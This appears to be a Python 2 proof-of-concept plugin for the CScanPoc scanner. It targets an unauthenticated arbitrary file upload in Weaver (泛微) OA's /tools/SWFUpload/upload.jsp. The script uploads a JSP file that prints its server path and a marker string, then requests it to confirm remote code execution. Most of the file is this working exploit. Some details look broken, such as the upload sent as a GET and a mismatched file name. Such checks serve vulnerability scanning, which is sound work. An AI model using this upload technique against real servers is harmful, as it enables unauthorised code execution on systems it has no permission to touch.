# coding: utf-8
import re

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'weaver_0101' # 平台漏洞编号，留空
    name = '泛微OA /tools/SWFUpload/upload.jsp 任意文件上传' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.FILE_UPLOAD # 漏洞类型
    disclosure_date = '2015-07-01'  # 漏洞公布时间
    desc = '''
    http://xxx.xxx.xxx.xxx/tools/SWFUpload/upload.jsp
    post:
        type="file" name="test"
    可以无需登录直接上传任意文件。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源http://www.wooyun.org/bugs/wooyun-2014-076547
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '泛微OA'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '82af2d56-a781-4aa2-b747-999bc650d435' # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
    
    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                    target=self.target, vuln=self.vuln))
            target_url = self.target + "/tools/SWFUpload/upload.jsp"
            verify_url = self.target + "/nulltest.jsp"
            files = {'test':('test.jsp', r"""<%@ page import="java.util.*,java.io.*" %>
            <%@ page import="java.io.*"%>
            <%
            String path=application.getRealPath(request.getRequestURI());
            File d=new File(path);
            out.println(path);
            %>
            <% out.println("payload=true");%>""")}
    
            req = requests.get(target_url,files=files)
            verify_req = requests.get(verify_url)
            content = verify_req.content
    
            if verify_req.status_code == 200 and 'payload=true' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
            
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()